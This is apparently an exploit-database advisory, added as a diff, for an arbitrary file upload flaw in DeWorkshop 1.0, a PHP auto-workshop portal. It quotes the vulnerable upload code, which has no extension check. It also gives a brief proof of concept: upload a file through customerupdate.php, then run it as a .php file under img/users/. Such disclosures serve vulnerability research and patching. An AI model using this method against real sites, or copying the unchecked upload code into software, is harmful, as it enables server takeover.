@@ -1,0 +1,39 @@
+# # # # #
+# Exploit Title: DeWorkshop 1.0 - Arbitrary File Upload
+# Dork: N/A
+# Date: 18.08.2017
+# Vendor Homepage : https://sarutech.com/
+# Software Link: https://codecanyon.net/item/deworkshop-auto-workshop-portal/20336737
+# Demo: https://demo.sarutech.com/deworkshop/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands and upload arbitrary file....
+#
+# Vulnerable Source:
+# .....................
+# $eid = $_GET["id"];
+# ......
+# $folder = "img/users/";
+# $extention = strrchr($_FILES['bgimg']['name'], ".");
+# $bgimg = $_FILES['bgimg']['name'];
+# //$bgimg = $new_name.'.jpg';
+# $uploaddir = $folder . $bgimg;
+# move_uploaded_file($_FILES['bgimg']['tmp_name'], $uploaddir);
+# .....................
+# 	
+# Proof of Concept:
+# 
+# Customer profile picture arbitrary file can be uploaded ..
+# 
+# http://localhost/[PATH]/customerupdate.php?id=1
+# http://localhost/[PATH]/img/users/[FILE].php
+# 
+#####
